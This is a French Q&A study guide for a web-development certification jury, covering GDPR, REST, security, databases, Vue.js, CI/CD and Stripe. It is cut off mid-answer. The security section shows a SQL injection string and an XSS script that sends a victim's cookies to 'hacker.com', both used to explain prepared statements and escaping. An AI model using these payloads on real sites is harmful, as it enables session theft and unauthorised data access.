# Questions / Réponses - Préparation Jury

## Table des matières

1. [RGPD et Protection des données](#rgpd-et-protection-des-données)
2. [API et Architecture](#api-et-architecture)
3. [Sécurité](#sécurité)
4. [Base de données](#base-de-données)
5. [Backend Node.js/Express](#backend-nodejsexpress)
6. [Frontend Vue.js](#frontend-vuejs)
7. [Tests et Qualité](#tests-et-qualité)
8. [CI/CD et DevOps](#cicd-et-devops)
9. [Méthodologie Projet](#méthodologie-projet)
10. [Accessibilité](#accessibilité)
11. [Paiement Stripe](#paiement-stripe)
12. [Questions Pièges Classiques](#questions-pièges-classiques)
13. [Questions sur ton Projet](#questions-sur-ton-projet)

---

# RGPD ET PROTECTION DES DONNÉES

## Questions de base

### Q: Qu'est-ce que le RGPD ?

**Réponse:**
Le RGPD (Règlement Général sur la Protection des Données) est un règlement européen entré en vigueur le 25 mai 2018. Il encadre le traitement des données personnelles des citoyens européens.

**Objectifs :**
- Protéger la vie privée des citoyens
- Harmoniser les lois sur la protection des données en Europe
- Responsabiliser les entreprises qui traitent des données

**Sanctions :** Jusqu'à 20 millions d'euros ou 4% du chiffre d'affaires mondial.

### Q: Quelle est la différence entre une donnée personnelle et une donnée sensible ?

**Réponse:**

| Donnée personnelle | Donnée sensible |
|-------------------|-----------------|
| Permet d'identifier une personne directement ou indirectement | Catégorie spéciale de données personnelles |
| Exemples : email, nom, adresse IP, numéro de téléphone | Exemples : origine ethnique, opinions politiques, religion, santé, orientation sexuelle, données biométriques |
| Traitement encadré par le RGPD | Traitement **interdit par défaut** sauf exceptions |

**Dans mon projet :** Je ne collecte que des données personnelles (email), aucune donnée sensible.

### Q: Quelles sont les 6 bases légales pour traiter des données personnelles ?

**Réponse:**
1. **Consentement** : L'utilisateur accepte explicitement (inscription)
2. **Exécution d'un contrat** : Nécessaire pour fournir le service (paiement)
3. **Obligation légale** : Imposé par la loi (factures conservées 10 ans)
4. **Intérêt vital** : Protéger la vie de quelqu'un (urgence médicale)
5. **Mission d'intérêt public** : Services publics
6. **Intérêt légitime** : Besoin justifié de l'entreprise (statistiques d'usage)

**Dans mon projet :**
- Email/password : Consentement (inscription volontaire)
- Paiement : Exécution du contrat
- Résultats de quiz : Intérêt légitime (suivi pédagogique)

### Q: Quels sont les droits des utilisateurs selon le RGPD ?

**Réponse:**
1. **Droit d'accès** : Savoir quelles données sont collectées → `GET /api/auth/me`
2. **Droit de rectification** : Modifier ses données → (à implémenter)
3. **Droit à l'effacement** (droit à l'oubli) : Supprimer son compte → CASCADE DELETE
4. **Droit à la portabilité** : Récupérer ses données dans un format exploitable
5. **Droit d'opposition** : Refuser certains traitements
6. **Droit à la limitation** : Geler le traitement temporairement
7. **Droit de ne pas être soumis à une décision automatisée**

### Q: Qu'est-ce que la minimisation des données ?

**Réponse:**
Principe RGPD qui impose de ne collecter que les données **strictement nécessaires** au fonctionnement du service.

**Dans mon projet :**
- Je collecte : email, mot de passe (hashé), rôle
- Je NE collecte PAS : nom, prénom, adresse, téléphone, date de naissance

**Pourquoi ?** Ces données ne sont pas nécessaires pour créer/jouer des quiz.

### Q: Qu'est-ce qu'un registre des traitements ?

**Réponse:**
Document obligatoire pour les entreprises de +250 salariés (recommandé pour tous) qui recense :
- Les types de données collectées
- La finalité du traitement
- La durée de conservation
- Les destinataires des données
- Les mesures de sécurité

### Q: Quelle est la durée de conservation des données ?

**Réponse:**
Les données ne doivent pas être conservées plus longtemps que nécessaire.

**Dans mon projet :**
| Donnée | Durée de conservation |
|--------|----------------------|
| Compte utilisateur | Jusqu'à suppression du compte |
| Résultats de quiz | Durée du compte |
| Données de paiement | 10 ans (obligation légale) |
| Logs | 1 an (sécurité) |

### Q: Qu'est-ce qu'un DPO ?

**Réponse:**
Le DPO (Data Protection Officer / Délégué à la Protection des Données) est une personne désignée pour :
- Veiller au respect du RGPD
- Conseiller l'entreprise
- Être le point de contact avec la CNIL

**Obligatoire pour :**
- Organismes publics
- Entreprises traitant des données à grande échelle
- Entreprises traitant des données sensibles

### Q: Qu'est-ce qu'une violation de données ? Que faire ?

**Réponse:**
Une violation de données est une faille de sécurité entraînant la destruction, la perte, l'altération ou la divulgation non autorisée de données personnelles.

**Obligations :**
1. Notifier la CNIL sous **72 heures**
2. Informer les personnes concernées si risque élevé
3. Documenter l'incident dans un registre

### Q: Qu'est-ce que le Privacy by Design ?

**Réponse:**
Principe qui impose d'intégrer la protection des données dès la conception du projet, pas après coup.

**Dans mon projet :**
- Hashage des mots de passe dès le début
- Minimisation des données collectées
- Suppression en cascade prévue dès la conception de la BDD

---

# API ET ARCHITECTURE

## Concepts de base

### Q: Qu'est-ce qu'une API ?

**Réponse:**
API (Application Programming Interface) est une interface qui permet à deux logiciels de communiquer entre eux.

**Analogie :** Le serveur dans un restaurant. Tu ne vas pas en cuisine, tu passes par le serveur (l'API) qui transmet ta commande et te rapporte ton plat.

**Dans mon projet :** L'API permet au frontend Vue.js de communiquer avec le backend Express pour créer des quiz, s'authentifier, etc.

### Q: Qu'est-ce qu'une API REST ?

**Réponse:**
REST (Representational State Transfer) est un style d'architecture pour les APIs qui utilise les standards HTTP.

**Principes REST :**
1. **Client-Serveur** : Séparation frontend/backend
2. **Sans état (Stateless)** : Chaque requête contient toutes les infos nécessaires
3. **Cacheable** : Les réponses peuvent être mises en cache
4. **Interface uniforme** : URLs représentent des ressources

**Verbes HTTP :**
| Verbe | Action | Exemple |
|-------|--------|---------|
| GET | Lire | `GET /api/quizzes` |
| POST | Créer | `POST /api/quizzes` |
| PUT | Modifier | `PUT /api/quizzes/1` |
| DELETE | Supprimer | `DELETE /api/quizzes/1` |

### Q: Quelle est la différence entre REST et GraphQL ?

**Réponse:**
| REST | GraphQL |
|------|---------|
| Plusieurs endpoints (`/users`, `/quizzes`) | Un seul endpoint (`/graphql`) |
| Données fixes par endpoint | Client demande exactement ce qu'il veut |
| Over-fetching possible | Pas d'over-fetching |
| Simple à comprendre | Courbe d'apprentissage |
| HTTP caching natif | Caching plus complexe |

**Mon choix :** REST car plus simple pour une application CRUD classique.

### Q: Qu'est-ce qu'un endpoint ?

**Réponse:**
Un endpoint est une URL spécifique de l'API qui effectue une action précise.

**Exemples dans mon projet :**
- `POST /api/auth/login` → Connexion
- `GET /api/quizzes` → Liste des quiz
- `DELETE /api/quizzes/:id` → Suppression d'un quiz

### Q: À quoi sert Swagger ?

**Réponse:**
Swagger (OpenAPI) est un outil pour documenter les APIs de manière interactive.

**Avantages :**
- Documentation auto-générée depuis le code
- Interface interactive pour tester les endpoints
- Génération de code client possible
- Standard reconnu dans l'industrie

**Dans mon projet :** J'ai configuré Swagger pour documenter tous mes endpoints avec leurs paramètres, réponses possibles et exemples.

### Q: Qu'est-ce qu'un code HTTP ? Citez les principaux.

**Réponse:**
Les codes HTTP indiquent le résultat d'une requête.

**Famille 2xx - Succès :**
- `200 OK` : Requête réussie
- `201 Created` : Ressource créée

**Famille 4xx - Erreur client :**
- `400 Bad Request` : Données invalides
- `401 Unauthorized` : Non authentifié
- `403 Forbidden` : Pas les droits
- `404 Not Found` : Ressource inexistante
- `409 Conflict` : Conflit (email déjà utilisé)

**Famille 5xx - Erreur serveur :**
- `500 Internal Server Error` : Bug côté serveur

### Q: Qu'est-ce que le format JSON ?

**Réponse:**
JSON (JavaScript Object Notation) est un format de données texte léger et lisible.

```json
{
  "id": 1,
  "title": "Mon Quiz",
  "questions": 10,
  "premium": false,
  "tags": ["histoire", "géographie"]
}
```

**Avantages :**
- Léger et lisible
- Supporté par tous les langages
- Standard du web pour les APIs

### Q: Qu'est-ce que l'architecture 3-tiers ?

**Réponse:**
Architecture qui sépare l'application en 3 couches :

1. **Couche Présentation** (Frontend) : Interface utilisateur → Vue.js
2. **Couche Métier** (Backend) : Logique de l'application → Express.js
3. **Couche Données** (Base de données) : Stockage → MySQL

**Avantages :**
- Séparation des responsabilités
- Maintenance facilitée
- Scalabilité indépendante de chaque couche

### Q: Qu'est-ce que le pattern MVC ?

**Réponse:**
MVC = Model-View-Controller

- **Model** : Gestion des données (base de données)
- **View** : Affichage (frontend)
- **Controller** : Logique métier (traitement des requêtes)

**Dans mon projet backend :**
```
routes/       → Définit les URLs
controllers/  → Logique métier
models/       → Requêtes BDD (implicite dans controllers)
```

### Q: Qu'est-ce qu'une requête HTTP ? Que contient-elle ?

**Réponse:**
Une requête HTTP est un message envoyé par le client au serveur.

**Composition :**
1. **Méthode** : GET, POST, PUT, DELETE
2. **URL** : `/api/quizzes/1`
3. **Headers** : Métadonnées (Authorization, Content-Type)
4. **Body** : Données envoyées (pour POST/PUT)

**Exemple :**
```
POST /api/auth/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Authorization: Bearer eyJhbG...

{ "email": "test@mail.com", "password": "Password123" }
```

---

# SÉCURITÉ

## Authentification

### Q: Qu'est-ce que l'authentification vs l'autorisation ?

**Réponse:**
| Authentification | Autorisation |
|-----------------|--------------|
| **Qui es-tu ?** | **Qu'as-tu le droit de faire ?** |
| Vérifier l'identité | Vérifier les permissions |
| Login/password, JWT | Rôles (prof, élève, admin) |
| Code 401 si échec | Code 403 si échec |

### Q: Qu'est-ce qu'un JWT ? Comment ça fonctionne ?

**Réponse:**
JWT (JSON Web Token) est un format de token d'authentification.

**Structure :** `header.payload.signature`
```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjF9.signature
```

**Flux :**
1. Login avec email/password
2. Serveur vérifie et génère un JWT
3. Client stocke le JWT (localStorage)
4. Client envoie le JWT à chaque requête (header Authorization)
5. Serveur vérifie le JWT et autorise

**Avantages :**
- Stateless (pas de session serveur)
- Auto-contenu (contient les infos de l'utilisateur)
- Scalable (fonctionne sur plusieurs serveurs)

### Q: Quelle est la différence entre JWT et les sessions ?

**Réponse:**
| JWT | Sessions |
|-----|----------|
| Stocké côté client | Stocké côté serveur |
| Stateless | Stateful |
| Scalable facilement | Sticky sessions nécessaires |
| Révocation difficile | Révocation facile |
| Token peut être volé (XSS) | Session ID peut être volé |

### Q: Qu'est-ce que le hashage ? Différence avec le chiffrement ?

**Réponse:**
| Hashage | Chiffrement |
|---------|-------------|
| Irréversible | Réversible avec clé |
| Toujours même taille | Taille variable |
| Pour les mots de passe | Pour les données à relire |
| bcrypt, SHA-256 | AES, RSA |

**Exemple bcrypt :**
```javascript
// Hashage (irréversible)
const hash = await bcrypt.hash("password", 10)
// "$2b$10$N9qo8uLOickgx2ZMRZoMy..."

// Vérification (sans déchiffrer)
const match = await bcrypt.compare("password", hash)
// true ou false
```

### Q: C'est quoi le salt dans bcrypt ?

**Réponse:**
Le salt est une chaîne aléatoire ajoutée au mot de passe avant le hashage.

**Sans salt :**
- "password" → toujours le même hash
- Attaque par dictionnaire possible

**Avec salt :**
- "password" + salt1 → hash1
- "password" + salt2 → hash2
- Chaque hash est unique

bcrypt génère et stocke le salt automatiquement dans le hash.

### Q: Qu'est-ce qu'une injection SQL ? Comment s'en protéger ?

**Réponse:**
Attaque où l'attaquant injecte du code SQL malveillant.

**Exemple vulnérable :**
```javascript
const query = "SELECT * FROM users WHERE email = '" + email + "'"
// Si email = "' OR 1=1 --"
// → SELECT * FROM users WHERE email = '' OR 1=1 --'
// Retourne TOUS les utilisateurs !
```

**Protection : Requêtes préparées**
```javascript
db.query("SELECT * FROM users WHERE email = ?", [email])
// Le ? est remplacé de façon sécurisée
```

### Q: Qu'est-ce que XSS ? Comment s'en protéger ?

**Réponse:**
XSS (Cross-Site Scripting) : injection de scripts malveillants dans une page web.

**Exemple :**
```html
<!-- L'attaquant entre comme nom : -->
<script>document.location='http://hacker.com/?cookie='+document.cookie</script>
```

**Protections :**
- Échapper les caractères HTML (`<` → `&lt;`)
- Vue.js échappe automatiquement avec `{{ }}`
- Content-Security-Policy (Helmet)
- Ne jamais utiliser `v-html` avec des données utilisateur

### Q: Qu'est-ce que CORS ?

**Réponse:**
CORS (Cross-Origin Resource Sharing) contrôle quels domaines peuvent appeler ton API.

**Problème :** Par défaut, un navigateur bloque les requêtes vers un autre domaine.
- Frontend sur `localhost:5173`
- Backend sur `localhost:3000`
= Origines différentes = bloqué

**Solution :**
```javascript
app.use(cors({
  origin: 'http://localhost:5173'
}))
```

### Q: À quoi sert Helmet ?

**Réponse:**
Helmet est un middleware Express qui ajoute des headers HTTP de sécurité.

**Headers ajoutés :**
- `X-Content-Type-Options: nosniff` : Empêche le sniffing MIME
- `X-Frame-Options: DENY` : Bloque les iframes (clickjacking)
- `Strict-Transport-Security` : Force HTTPS
- `Content-Security-Policy` : Limite les sources de scripts

**Utilisation :**
```javascript
app.use(helmet())
```

### Q: Qu'est-ce que HTTPS ? Pourquoi est-ce important ?

**Réponse:**
HTTPS = HTTP + SSL/TLS. Les données sont chiffrées entre le client et le serveur.

**Sans HTTPS :**
- Données visibles par n'importe qui sur le réseau
- Mots de passe interceptables
- Attaque "man-in-the-middle" possible

**Avec HTTPS :**
- Données chiffrées
- Certificat vérifie l'identité du serveur
- Obligatoire pour les paiements, login, données sensibles

### Q: Qu'est-ce que l'OWASP Top 10 ?

**Réponse:**
Liste des 10 vulnérabilités web les plus critiques, mise à jour régulièrement.

**Top 10 (2021) :**
1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQL, XSS)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging Failures
10. Server-Side Request Forgery

---

# BASE DE DONNÉES

### Q: Qu'est-ce qu'une base de données relationnelle ?

**Réponse:**
Une BDD où les données sont organisées en tables avec des relations entre elles.

**Caractéristiques :**
- Tables avec lignes et colonnes
- Relations via clés étrangères
- Langage SQL pour les requêtes
- ACID (Atomicité, Cohérence, Isolation, Durabilité)

**Exemples :** MySQL, PostgreSQL, SQLite, Oracle

### Q: Différence entre SQL et NoSQL ?

**Réponse:**
| SQL | NoSQL |
|-----|-------|
| Tables avec schéma fixe | Documents flexibles |
| Relations entre tables | Données dénormalisées |
| ACID garanti | Éventuellement cohérent |
| Requêtes complexes | Scalabilité horizontale |
| MySQL, PostgreSQL | MongoDB, Redis |

**Mon choix :** MySQL car mes données sont structurées et relationnelles.

### Q: Qu'est-ce qu'une clé primaire ?

**Réponse:**
Identifiant unique de chaque ligne dans une table.

**Caractéristiques :**
- Unique
- Non null
- Généralement auto-incrémenté
- Indexée automatiquement

```sql
id INT PRIMARY KEY AUTO_INCREMENT
```

### Q: Qu'est-ce qu'une clé étrangère ?

**Réponse:**
Champ qui référence la clé primaire d'une autre table, créant une relation.

```sql
user_id INT,
FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
```

**Dans mon projet :** `quizzes.user_id` → `users.id`

### Q: Qu'est-ce que CASCADE DELETE ?

**Réponse:**
Quand on supprime un enregistrement parent, tous les enfants sont supprimés automatiquement.

**Exemple :** Supprimer un utilisateur supprime aussi ses quiz, questions, résultats...

**Alternative :** `SET NULL` met la clé étrangère à NULL au lieu de supprimer.

### Q: Qu'est-ce qu'un index ? Pourquoi en utiliser ?

**Réponse:**
Structure de données qui accélère les recherches sur une colonne.

**Sans index :** MySQL parcourt toute la table (scan complet)
**Avec index :** MySQL trouve directement (comme l'index d'un livre)

**Inconvénient :** Ralentit les écritures (INSERT, UPDATE, DELETE)

**Quand indexer :**
- Colonnes dans WHERE fréquemment
- Clés étrangères
- Colonnes dans ORDER BY

### Q: Qu'est-ce que la normalisation ?

**Réponse:**
Processus d'organisation des données pour réduire la redondance.

**Formes normales :**
- **1NF** : Valeurs atomiques, pas de listes
- **2NF** : Tout dépend de la clé primaire entière
- **3NF** : Pas de dépendance transitive

**Exemple de dénormalisation :** Stocker le nom du quiz dans results au lieu de juste quiz_id (évite une jointure mais duplique les données).

### Q: Qu'est-ce que MCD et MLD ?

**Réponse:**
**MCD (Modèle Conceptuel de Données) :**
- Schéma abstrait
- Entités et relations
- Pas de détails techniques

**MLD (Modèle Logique de Données) :**
- Traduction technique du MCD
- Tables, colonnes, types
- Clés primaires et étrangères

### Q: Qu'est-ce qu'une transaction ?

**Réponse:**
Ensemble d'opérations qui doivent toutes réussir ou toutes échouer.

```sql
START TRANSACTION;
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
UPDATE accounts SET balance = balance + 100 WHERE id = 2;
COMMIT; -- ou ROLLBACK si erreur
```

**Propriétés ACID :**
- **Atomicité** : Tout ou rien
- **Cohérence** : État valide après transaction
- **Isolation** : Transactions indépendantes
- **Durabilité** : Changements permanents après commit

### Q: Qu'est-ce qu'une jointure SQL ?

**Réponse:**
Opération qui combine des données de plusieurs tables.

```sql
SELECT q.title, u.email
FROM quizzes q
JOIN users u ON q.user_id = u.id
```

**Types :**
- `INNER JOIN` : Seulement les correspondances
- `LEFT JOIN` : Tout de gauche + correspondances de droite
- `RIGHT JOIN` : Tout de droite + correspondances de gauche

---

# BACKEND NODE.JS/EXPRESS

### Q: Qu'est-ce que Node.js ?

**Réponse:**
Environnement d'exécution JavaScript côté serveur, basé sur le moteur V8 de Chrome.

**Caractéristiques :**
- Non-bloquant et asynchrone
- Single-threaded avec event loop
- NPM : gestionnaire de packages

**Avantage :** Même langage front et back.

### Q: Qu'est-ce qu'Express.js ?

**Réponse:**
Framework web minimaliste pour Node.js.

**Fonctionnalités :**
- Routing
- Middlewares
- Gestion des requêtes/réponses
- Support des templates

### Q: Qu'est-ce qu'un middleware ?

**Réponse:**
Fonction qui s'exécute entre la requête et la réponse.

```javascript
function middleware(req, res, next) {
  // Faire quelque chose
  next() // Passer au suivant
}
```

**Exemples dans mon projet :**
- `authenticateToken` : Vérifie le JWT
- `requireProf` : Vérifie le rôle
- `validateQuiz` : Valide les données

### Q: Qu'est-ce que le routing ?

**Réponse:**
Définition des URLs et des actions associées.

```javascript
router.get('/quizzes', getQuizzes)      // Liste
router.get('/quizzes/:id', getQuiz)     // Détail
router.post('/quizzes', createQuiz)     // Création
router.put('/quizzes/:id', updateQuiz)  // Modification
router.delete('/quizzes/:id', deleteQuiz) // Suppression
```

### Q: Qu'est-ce qu'async/await ?

**Réponse:**
Syntaxe moderne pour gérer les opérations asynchrones.

```javascript
// Avec Promesses
api.post('/login', data)
  .then(response => { /* ... */ })
  .catch(error => { /* ... */ })

// Avec async/await (plus lisible)
async function login() {
  try {
    const response = await api.post('/login', data)
    // ...
  } catch (error) {
    // ...
  }
}
```

### Q: Qu'est-ce que npm ?

**Réponse:**
NPM (Node Package Manager) est le gestionnaire de packages de Node.js.

**Commandes :**
- `npm install` : Installe les dépendances
- `npm install express` : Ajoute un package
- `npm run dev` : Exécute un script
- `npm test` : Lance les tests

**Fichiers :**
- `package.json` : Liste des dépendances et scripts
- `package-lock.json` : Versions exactes
- `node_modules/` : Packages installés (gitignore)

### Q: Différence entre `npm install` et `npm ci` ?

**Réponse:**
| npm install | npm ci |
|-------------|--------|
| Installe depuis package.json | Installe depuis package-lock.json |
| Peut modifier le lock file | Ne modifie jamais le lock file |
| Pour le développement | Pour le CI/CD |
| Plus lent | Plus rapide |

### Q: Qu'est-ce que les variables d'environnement ?

**Réponse:**
Variables de configuration stockées en dehors du code.

**Fichier `.env` :**
```
DB_HOST=localhost
DB_USER=root
JWT_SECRET=mon_secret_ultra_securise
STRIPE_SECRET_KEY=sk_test_xxx
```

**Utilisation :**
```javascript
require('dotenv').config()
const secret = process.env.JWT_SECRET
```

**Avantages :**
- Secrets hors du code
- Config différente dev/prod
- Jamais commité (gitignore)

---

# FRONTEND VUE.JS

### Q: Qu'est-ce que Vue.js ?

**Réponse:**
Framework JavaScript progressif pour créer des interfaces utilisateur.

**Caractéristiques :**
- Réactivité : l'interface se met à jour automatiquement
- Composants : blocs réutilisables
- Single File Components (.vue)
- Écosystème complet (Router, Pinia)

### Q: Qu'est-ce que la Composition API ?

**Réponse:**
Nouvelle façon d'écrire des composants Vue 3 avec `<script setup>`.

**Avantages vs Options API :**
- Code regroupé par fonctionnalité
- Meilleur support TypeScript
- Logique réutilisable via composables
- Moins de boilerplate

### Q: Différence entre ref() et reactive() ?

**Réponse:**
```javascript
// ref : pour les primitives
const count = ref(0)
count.value++ // Nécessite .value

// reactive : pour les objets
const user = reactive({ name: 'Jean' })
user.name = 'Pierre' // Pas de .value
```

**Conseil :** Utiliser `ref()` par défaut, plus prévisible.

### Q: Qu'est-ce que computed() ?

**Réponse:**
Valeur calculée qui se met à jour automatiquement quand ses dépendances changent.

```javascript
const score = ref(8)
const total = ref(10)
const pourcentage = computed(() => (score.value / total.value) * 100)
// pourcentage.value = 80
// Se recalcule si score ou total change
```

### Q: Qu'est-ce qu'un composable ?

**Réponse:**
Fonction réutilisable qui encapsule de la logique avec la Composition API.

```javascript
// composables/useSeo.js
export function useSeo(title, description) {
  document.title = title
  // ...
}

// Dans un composant
import { useSeo } from '../composables/useSeo'
useSeo('Ma Page', 'Description')
```

### Q: Qu'est-ce que Pinia ?

**Réponse:**
Bibliothèque de gestion d'état officielle pour Vue 3 (remplace Vuex).

**Structure d'un store :**
```javascript
export const useAuthStore = defineStore('auth', () => {
  // State
  const user = ref(null)

  // Getters
  const isAuthenticated = computed(() => !!user.value)

  // Actions
  async function login(email, password) { /* ... */ }

  return { user, isAuthenticated, login }
})
```

### Q: Qu'est-ce que Vue Router ?

**Réponse:**
Système de navigation officiel pour Vue.js.

**Fonctionnalités :**
- Routes avec composants
- Navigation guards
- Paramètres d'URL (`:id`)
- Mode history (URLs propres)

### Q: Qu'est-ce qu'un guard de navigation ?

**Réponse:**
Fonction qui s'exécute avant d'accéder à une route.

```javascript
router.beforeEach((to, from, next) => {
  if (to.meta.requiresAuth && !isAuthenticated) {
    next('/auth') // Redirect
  } else {
    next() // Continue
  }
})
```

### Q: Qu'est-ce que Tailwind CSS ?

**Réponse:**
Framework CSS utility-first avec des classes prédéfinies.

```html
<button class="bg-blue-500 text-white p-4 rounded hover:bg-blue-600">
  Cliquer
</button>
```

**Avantages :**
- Développement rapide
- Pas de CSS personnalisé
- Design system cohérent
- Responsive avec breakpoints (`md:`, `lg:`)

### Q: Qu'est-ce que Vite ?

**Réponse:**
Outil de build moderne pour le frontend, remplace Webpack.

**Avantages :**
- Démarrage instantané
- Hot Module Replacement rapide
- Build optimisé pour la production

**Commandes :**
- `npm run dev` : Serveur de développement
- `npm run build` : Build production

### Q: Qu'est-ce qu'une SPA ?

**Réponse:**
SPA (Single Page Application) : application qui ne recharge jamais la page.

**Fonctionnement :**
1. Chargement initial de l'app
2. Navigation gérée par JavaScript
3. Contenu mis à jour dynamiquement
4. URLs changent sans rechargement

**Avantages :** Navigation fluide, expérience app native
**Inconvénient :** SEO plus difficile

---

# TESTS ET QUALITÉ

### Q: Pourquoi écrire des tests automatisés ?

**Réponse:**
- Détecter les bugs avant la production
- Éviter les régressions (casser ce qui marchait)
- Documenter le comportement attendu
- Refactorer en confiance
- Gain de temps à long terme

### Q: Différence entre test unitaire et test d'intégration ?

**Réponse:**
| Test unitaire | Test d'intégration |
|--------------|-------------------|
| Teste une fonction isolée | Teste plusieurs composants ensemble |
| Rapide | Plus lent |
| Mocks des dépendances | Vraies dépendances |
| `validateEmail()` | `POST /api/auth/register` |

### Q: Qu'est-ce qu'un mock ?

**Réponse:**
Faux objet qui simule le comportement d'une dépendance.

```javascript
// Mock d'Axios
vi.mock('axios')
axios.get.mockResolvedValue({ data: { quizzes: [] } })

// Le test utilise le mock au lieu du vrai Axios
```

### Q: Qu'est-ce que la couverture de code ?

**Réponse:**
Pourcentage de code exécuté par les tests.

**Métriques :**
- Lines : lignes de code
- Branches : conditions if/else
- Functions : fonctions
- Statements : instructions

**Attention :** 100% de couverture ne garantit pas 0 bug.

### Q: Qu'est-ce que TDD ?

**Réponse:**
TDD (Test-Driven Development) : écrire les tests AVANT le code.

**Cycle :**
1. Écrire un test qui échoue (red)
2. Écrire le minimum de code pour le faire passer (green)
3. Refactorer (refactor)

---

# CI/CD ET DEVOPS

### Q: Qu'est-ce que CI/CD ?

**Réponse:**
**CI (Continuous Integration) :** À chaque push, le code est automatiquement testé.
**CD (Continuous Deployment) :** Si les tests passent, le code est automatiquement déployé.

### Q: Qu'est-ce que GitHub Actions ?

**Réponse:**
Service CI/CD intégré à GitHub.

**Workflow typique :**
```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm test
```

### Q: Différence entre ESLint et Prettier ?

**Réponse:**
| ESLint | Prettier |
|--------|----------|
| Qualité du code | Formatage |
| Détecte les erreurs | Indentation, guillemets |
| Configurable | Peu d'options |
| `no-unused-vars` | Tabs vs spaces |

### Q: Qu'est-ce que Git ? Commandes principales ?

**Réponse:**
Git est un système de contrôle de version distribué.

**Commandes :**
- `git clone` : Copier un repo
- `git add .` : Ajouter les changements
- `git commit -m "message"` : Créer un commit
- `git push` : Envoyer sur le serveur
- `git pull` : Récupérer les changements
- `git branch` : Gérer les branches
- `git merge` : Fusionner les branches

### Q: Qu'est-ce qu'un conteneur Docker ?

**Réponse:**
Environnement isolé qui contient une application et ses dépendances.

**Avantages :**
- "Ça marche sur ma machine" résolu
- Même environnement dev/prod
- Déploiement simplifié
- Scalabilité

---

# MÉTHODOLOGIE PROJET

### Q: Qu'est-ce que la méthode Agile ?

**Réponse:**
Approche de gestion de projet itérative et incrémentale.

**Principes :**
- Livraisons fréquentes
- Adaptation au changement
- Collaboration avec le client
- Équipes auto-organisées

### Q: Qu'est-ce que Scrum ?

**Réponse:**
Framework Agile avec des rôles et cérémonies définis.

**Rôles :** Product Owner, Scrum Master, Équipe
**Événements :** Sprint, Planning, Daily, Review, Rétrospective

### Q: Qu'est-ce qu'un sprint ?

**Réponse:**
Période fixe (1-4 semaines) pendant laquelle on développe un ensemble de fonctionnalités.

### Q: Qu'est-ce qu'une user story ?

**Réponse:**
Description d'une fonctionnalité du point de vue de l'utilisateur.

**Format :** "En tant que [rôle], je veux [action] pour [bénéfice]."

**Exemple :** "En tant que professeur, je veux créer un quiz pour évaluer mes élèves."

### Q: Qu'est-ce que SMART ?

**Réponse:**
Méthode pour définir des objectifs :
- **S**pécifique
- **M**esurable
- **A**tteignable
- **R**éaliste
- **T**emporel

### Q: Qu'est-ce qu'un diagramme de Gantt ?

**Réponse:**
Représentation visuelle du planning projet avec les tâches et leurs durées sur un axe temporel.

### Q: Qu'est-ce que la matrice RACI ?

**Réponse:**
Matrice de responsabilités :
- **R**esponsable : Fait le travail
- **A**ccountable : Valide
- **C**onsulted : Consulté
- **I**nformed : Informé

---

# ACCESSIBILITÉ

### Q: Qu'est-ce que WCAG ?

**Réponse:**
WCAG (Web Content Accessibility Guidelines) : normes internationales d'accessibilité web.

**Niveaux :** A (minimum), AA (recommandé), AAA (optimal)

**Principes POUR :**
1. Perceptible
2. Operable
3. Understandable
4. Robust

### Q: Qu'est-ce que ARIA ?

**Réponse:**
ARIA (Accessible Rich Internet Applications) : attributs HTML pour l'accessibilité.

**Exemples :**
- `aria-label` : Nom accessible
- `aria-describedby` : Description liée
- `role` : Rôle de l'élément
- `aria-live` : Annonces dynamiques

### Q: Qu'est-ce qu'un skip link ?

**Réponse:**
Lien permettant de sauter au contenu principal, utile pour la navigation au clavier.

### Q: Pourquoi le contraste est-il important ?

**Réponse:**
Un contraste suffisant (4.5:1 minimum) permet aux personnes malvoyantes de lire le contenu.

---

# PAIEMENT STRIPE

### Q: Comment fonctionne Stripe Checkout ?

**Réponse:**
1. Client clique "Payer"
2. Backend crée une session Checkout
3. Client redirigé vers Stripe
4. Client paie
5. Stripe appelle le webhook
6. Backend met à jour la BDD
7. Client redirigé vers la page succès

### Q: Qu'est-ce qu'un webhook ?

**Réponse:**
URL que Stripe appelle automatiquement quand un événement se produit.

**Avantages :**
- Fiable (même si le client ferme son navigateur)
- Sécurisé (signature vérifiable)
- Asynchrone (3D Secure peut prendre du temps)

### Q: Pourquoi vérifier la signature du webhook ?

**Réponse:**
Pour s'assurer que la requête vient bien de Stripe et n'a pas été falsifiée.

```javascript
const event = stripe.webhooks.constructEvent(body, sig, secret)
```

---

# QUESTIONS PIÈGES CLASSIQUES

### Q: Différence entre `==` et `===` ?

**Réponse:**
- `==` : Comparaison avec coercion de type (DANGEREUX)
- `===` : Comparaison stricte (TOUJOURS utiliser)

```javascript
"5" == 5   // true (coercion)
"5" === 5  // false (types différents)
```

### Q: Qu'est-ce que `null` vs `undefined` ?

**Réponse:**
- `undefined` : Variable déclarée mais pas initialisée
- `null` : Valeur volontairement vide

```javascript
let a;        // undefined
let b = null; // null (intentionnel)
```

### Q: Qu'est-ce que le hoisting ?

**Réponse:**
JavaScript "remonte" les déclarations de variables et fonctions en haut du scope.

```javascript
console.log(x) // undefined (pas d'erreur avec var)
var x = 5

// Équivalent à :
var x
console.log(x)
x = 5
```

**Solution :** Utiliser `const` et `let` (pas de hoisting).

### Q: Différence entre `let`, `const` et `var` ?

**Réponse:**
| | var | let | const |
|-|-----|-----|-------|
| Scope | Fonction | Bloc | Bloc |
| Hoisting | Oui | Non | Non |
| Réassignable | Oui | Oui | Non |
| Redéclarable | Oui | Non | Non |

**Conseil :** `const` par défaut, `let` si besoin de réassigner.

### Q: Qu'est-ce que localStorage ? Limites ?

**Réponse:**
Stockage clé-valeur dans le navigateur.

**Limites :**
- ~5 Mo max
- Synchrone (bloque le thread)
- Accessible via JavaScript (risque XSS)
- Pas d'expiration automatique
- Spécifique au domaine

### Q: Différence entre `for...in` et `for...of` ?

**Réponse:**
```javascript
const arr = ['a', 'b', 'c']

for (let i in arr) console.log(i) // 0, 1, 2 (index)
for (let v of arr) console.log(v) // 'a', 'b', 'c' (valeurs)
```

### Q: Qu'est-ce qu'une closure ?

**Réponse:**
Fonction qui "capture" les variables de son scope parent.

```javascript
function counter() {
